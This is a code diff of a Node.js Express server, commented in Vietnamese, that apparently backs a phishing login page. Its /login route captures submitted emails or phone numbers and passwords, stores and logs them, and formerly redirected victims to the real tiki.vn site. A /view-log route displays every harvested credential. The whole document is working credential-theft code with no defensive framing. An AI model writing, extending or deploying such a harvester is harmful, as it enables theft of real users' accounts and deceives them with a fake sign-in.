@@ -12,7 +12,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// Route POST để nhận thông tin đăng nhập và lưu vào mảng
+// Route POST để lưu thông tin đăng nhập
 app.post("/login", (req, res) => {
   const { emailOrPhone, password } = req.body;
 
@@ -26,14 +26,14 @@ app.post("/login", (req, res) => {
   loginData.push(logEntry); // Lưu vào mảng
 
   console.log("Dữ liệu lưu:", logEntry);
-  res.json({
-    success: true,
-    redirectUrl: "https://tiki.vn/",
-  });
+
+  // Trả về phản hồi thành công mà không cần redirect từ server
+  res.json({ success: true });
 });
 
-// Route GET để hiển thị nội dung đăng nhập đã lưu
+// Route GET để xem thông tin đăng nhập đã lưu
 app.get("/view-log", (req, res) => {
+  console.log("Dữ liệu hiện có:", loginData); // Kiểm tra dữ liệu đã lưu
   if (loginData.length === 0) {
     return res.status(404).send("<h1>Không có dữ liệu đăng nhập nào!</h1>");
   }
@@ -63,11 +63,6 @@ app.get("/view-log", (req, res) => {
       </body>
     </html>
   `);
-});
-
-// Route mặc định trả về trang login
-app.get("/some-path", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // Chạy server trên port 3000
